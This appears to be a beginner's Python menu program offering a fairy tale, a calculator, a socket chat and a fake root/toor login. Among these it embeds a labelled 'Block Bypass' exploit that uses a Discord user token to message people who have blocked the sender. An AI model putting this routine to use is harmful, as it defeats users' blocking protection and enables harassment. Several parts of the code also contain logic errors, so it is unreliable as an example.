import socket
from time import sleep
from os import system
from sys import argv
from getopt import getopt
from getopt import error
from subprocess import PIPE
from subprocess import Popen
from requests import post

# The most important global variables
ans1 = 0
ans2 = 0

# Here comes the arguments like "--version" or "--help"
argumentList = argv[1:]
 
# Options
options = "vhmo:"
 
# Long options
long_options = ["help", "my_file", "Output =", "version"]
 
try:
    arguments, values = getopt(argumentList, options, long_options)
    for currentArgument, currentValue in arguments:
 
        if currentArgument in ("-h", "--help"):
            print('''
            This is the help for the UCBS,
            see version, to display version''')
            exit()
        elif currentArgument in ("-m", "--my_file"):
            print("Displaying file_name:", argv[0])
            exit()
        elif currentArgument in ("-v", "--version"):
            print('''UCBS version 0.1''')
            exit()

except error as err:
    print (str(err))


# Function for socket chat-server
def super_server():
    new_socket = socket.socket()
    host_name = socket.gethostname()
    s_ip = socket.gethostbyname(host_name)
    get_local_addr = Popen("ifconfig|grep 'inet '|awk '{print $2}'|grep -v '127.0.0.1'|grep -v '127.0.0.1'", shell=True, stdout=PIPE).stdout
    local_addr =  get_local_addr.read()
    port = 8080
    
    new_socket.bind((host_name, port))
    print( "Binding successful!")
    print("This is your IP: ", s_ip + " (local addr is " + local_addr.decode() + ")")
    
    name = input('Enter name: ')
    
    new_socket.listen(1) 
    
    
    conn, add = new_socket.accept()
    
    print("Received connection from ", add[0])
    print('Connection Established. Connected From: ',add[0])
    
    client = (conn.recv(1024)).decode()
    print(client + ' has connected.')
    
    conn.send(name.encode())
    while True:
        message = input('Me : ')
        conn.send(message.encode())
        message = conn.recv(1024)
        message = message.decode()
        print(client, ':', message)



# Function for the socket chat-client
def super_client():
    socket_server = socket.socket()
    server_host = socket.gethostname()
    ip = socket.gethostbyname(server_host)
    sport = 8080
    
    print('This is your IP address: ',ip)
    server_host = input('Enter friend\'s IP address:')
    name = input('Enter Friend\'s name: ')
    
    
    socket_server.connect((server_host, sport))
    
    socket_server.send(name.encode())
    server_name = socket_server.recv(1024)
    server_name = server_name.decode()
    
    print(server_name,' has joined...')
    while True:
        message = (socket_server.recv(1024)).decode()
        print(server_name, ":", message)
        message = input("Me : ")
        socket_server.send(message.encode())  



# Name: Block Bypass
# Description: Send messages to blocked users
# Author: checksum (@0daySkid)
# Original founder: Yaekith
# Edited by: Vladus009
def dc_messanger():
    tocen = input("tocen pls:")
    user_id = input("user_id pls:")
    class Exploit:

        def __init__(self, token, client):
            self.token = token
            self.client_id = client
            self.headers = {'Authorization': token}


        def _get_channel_id(self, client_id):
            """ return channel id from client id """
            res = post('https://discordapp.com/api/v6/users/@me/channels', headers=self.headers, json={'recipient_id': self.client_id})
            return res.json().get('id')


        def execute(self, message):
            """ send message to client """
            channel_id = self._get_channel_id(self.client_id)
            return post(f'https://discordapp.com/api/v6/channels/{channel_id}/messages', headers=self.headers, json={'content': message})

        
    def main():
        token = tocen
        client_id = user_id

        exploit = Exploit(token, client_id)

        while True:
            message = input("Message > ")
            if not message:
                continue
            if message == "/quit":
                super_variable_a = input("Are you sure, you want to quit?\n(Y, N)")
                if super_variable_a == "":
                    MainMenu()
                    exit()
                elif super_variable_a == "n":
                    system("cls")
                    dc_messanger()
                    exit()
                elif super_variable_a == "N":
                    system("cls")
                    dc_messanger()
                    exit()
                elif super_variable_a == "Y":
                    MainMenu()
                    exit()
                elif super_variable_a == "y":
                    MainMenu()
                    exit()
            exploit.execute(message)

    if __name__ == '__main__':
        main()

# Username input
username = input("Username on tty1:")

# Username check
while username != "root" :
    print("Username Don't Exist, try again!")
    username = input("Uusername on tty1:")

# Too many wrong passwords - death
password_trying = 0

# Password input
password = input("Password for " + username + ":")

# Password check
while password != "toor":
    print("Wrong Password, try again!")
    password = input("Password for " + username + ":")
    password_trying = password_trying + 1
    if password_trying == 2:
        print("Too many wrong Passwords!")
        exit()

# Function for calculator ending
def calc_try_again():
    calc_asn_1 = input("Try again?:")
    if calc_asn_1 == "y" and "Y":
        calculator()
    else:
        MainMenu()

# Function to get back to main menu
def get_back():
    input("Press any key to get back to main menu...")
    system("cls")
    MainMenu()

# The calculator function
def calculator():
    system("cls")
    calc1 = int(input("Specify the first number:"))
    calc2 = int(input("Specify the second number:"))
    calc3 = input("Specify the operation (eg. + - * /)")

    if calc3 == "+":
        calc_ans = calc1 + calc2
        print("The result was {}".format(calc_ans))
        calc_try_again()
    elif calc3 == "*":
        calc_ans = calc1 * calc2
        print("The result was {}".format(calc_ans))
        calc_try_again()
    elif calc3 == "-":
        calc_ans = calc1 - calc2
        print("The result was {}".format(calc_ans))
        calc_try_again()
    elif calc3 == "/" and "\\":
        calc_ans = calc1 / calc2
        print("The result was {}".format(calc_ans))
        calc_try_again()
    elif calc3 == "":
        print("Wrong operation, try again!")
        sleep(2)
        calculator()
    elif calc1 ==  int() and "":
        print("Wrong number, try again!")
        sleep(2)  
        calculator()  
    elif calc2 == int() and "":
        print("Wrong number, try again!")
        sleep(2)  
        calculator() 

# Function to continue
def anykey(): 
    input("Press any key to continue...")

# Function to read le story
def story1(): 
    system("cls")
    print(''' 
    Once upon a time there lived a poor widow and her son Jack. One day, Jack’s
    mother told him to sell their only cow. Jack went to the market and on the way
    he met a man who wanted to buy his cow. Jack asked, “What will you give me
    in return for my cow?” The man answered, “I will give you five magic beans!”
    Jack took the magic beans and gave the man the cow. But when he reached 
    home, Jack’s mother was very angry. She said, “You fool! He took away your
    cow and gave you some beans!” She threw the beans out of the window. Jack
    was very sad and went to sleep without dinner\n''')
    anykey()  
    system("cls")
    print('''The next day, when Jack woke up in the morning and looked out of the window,
    he saw that a huge beanstalk had grown from his magic beans! He climbed up
    the beanstalk and reached a kingdom in the sky. There lived a giant and his
    wife. Jack went inside the house and found the giant’s wife in the kitchen. Jack
    said, “Could you please give me something to eat? I am so hungry!” The kind
    wife gave him bread and some milk.\n''')
    anykey()  
    system("cls")
    print(''' 
    While he was eating, the giant came home. The giant was very big and looked
    very fearsome. Jack was terrified and went and hid inside. The giant cried, 
    “Fee-fi-fo-fum, I smell the blood of an Englishman. Be he alive, or be he dead,
    I’ll grind his bones to make my bread!” The wife said, “There is no boy in here!”
    So, the giant ate his food and then went to his room. He took out his sacks of 
    gold coins, counted them and kept them aside. Then he went to sleep. In the 
    night, Jack crept out of his hiding place, took one sack of gold coins and climbed
    down the beanstalk. At home, he gave the coins to his mother. His mother was very
    happy and they lived well for sometime.\n''')
    anykey()  
    system("cls")
    print(''' 
    Climbed the beanstalk and went to the giant’s house again. Once again, Jack 
    asked the giant’s wife for food, but while he was eating the giant returned. Jack 
    leapt up in fright and went and hid under the bed. The giant cried, “Fee-fifo-fum,
    I smell the blood of an Englishman. Be he alive, or be he dead, I’ll grind his 
    bones to make my bread!” The wife said, “There is no boy in here!” The giant ate 
    his food and went to his room. There, he took out a hen. He shouted, “Lay!” and 
    the hen laid a golden egg. When the giant fell asleep, Jack took the hen and
    climbed down the beanstalk. Jack’s mother was very happy with him.\n''')
    anykey()  
    system("cls")
    print(''' 
    After some days, Jack once again climbed the beanstalk and went to the giant’s 
    castle. For the third time, Jack met the giant’s wife and asked for some food. 
    Once again, the giant’s wife gave him bread and milk. But while Jack was 
    eating, the giant came home. “Fee-fi-fo-fum, I smell the blood of an Englishman. 
    Be he alive, or be he dead, I’ll grind his bones to make my bread!” cried the 
    giant. “Don’t be silly! There is no boy in here!” said his wife.\n''')
    anykey()  
    system("cls")
    print(''' 
    The giant had a magical harp that could play beautiful songs. While the giant 
    slept, Jack took the harp and was about to leave. Suddenly, the magic harp 
    cried, “Help master! A boy is stealing me!” The giant woke up and saw Jack with 
    the harp. Furious, he ran after Jack. But Jack was too fast for him. He ran down 
    the beanstalk and reached home. The giant followed him down. Jack quickly ran 
    inside his house and fetched an axe. He began to chop the beanstalk.
    The giant fell and died.  
    Jack and his mother were now very rich and they lived happily ever after.\n''')
    sleep(3)
    get_back()

# Oh boy, here comes the MainMenu function
def MainMenu():
        system("cls")
        print("Hello " + username + ", and welcome to the UCBS")
        print(''' 
        [1] Read a story  
        [2] Parrot
        [3] Chat?
        [4] Calculator
        [5] Help
        [6] About  
        [7] Discord Messanger
        [8] 
        [9] 
        [99]Exit\n''')
        ans1 = input(username + "@UCBS-box:~/Desktop$ ")
        # Jobs
        if ans1 == "99":  
            print("Goodbye! Will see you next time...")
        elif ans1 == "6": 
            print("UCBS stands for Universal Chat-Boting System")
            print('''UCBS was made by a 12 years old Student, that lived in Ukraine''')
            get_back()
        elif ans1 == "1": 
            story1()  
        elif ans1 == "2": 
            system("terminal-parrot")
            system("cls")
            MainMenu()
        elif ans1 == "5": 
            print("Loading...")
            sleep(4)  
            print("No Help avaible, try waiting few minutes and try again.\n")
            input("Press any key to continue...")
            MainMenu()
        elif ans1 == "4": 
            calculator()
        elif ans1 == "7":
            print("Starting client")
            sleep(3)
            dc_messanger() # It's not even fully made
            MainMenu()
        elif ans1 == "3":
            ans3 = input('''Start Server or client?
    (S, or C)
>>>''')
            if ans3 == "S" and "s":
                print("Starting server...")
                sleep(4) # niiiiice
                super_server()
                MainMenu()
            elif ans3 == "C" and "c":
                print("Starting client...")
                sleep(2.5) # nice
                super_client()
                MainMenu()
            else:
                print("Wrong operation, try again!")
                sleep(2)
                MainMenu()
        else: 
            print("Wrong Operation, try again!")
            sleep(2)  
            MainMenu()
MainMenu()